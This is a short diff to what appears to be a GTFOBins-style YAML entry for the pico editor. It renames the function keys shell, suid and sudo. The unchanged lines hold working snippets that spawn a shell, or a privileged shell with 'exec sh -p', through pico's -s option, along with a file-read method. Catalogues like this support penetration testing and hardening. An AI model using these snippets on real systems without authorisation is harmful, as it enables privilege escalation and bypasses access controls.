@@ -1,6 +1,6 @@
 ---
 functions:
-  execute-interactive:
+  shell:
     - code: |
         TF=$(mktemp)
         echo 'exec sh' > $TF
@@ -14,14 +14,14 @@ functions:
         ^O
   file-read:
     - code: pico file_to_read
-  suid-enabled:
+  suid:
     - code: |
         TF=$(mktemp)
         echo 'exec sh -p' > $TF
         chmod +x $TF
         ./pico -s $TF /etc/hosts
         ^T
-  sudo-enabled:
+  sudo:
     - code: |
         TF=$(mktemp)
         echo 'exec sh' > $TF
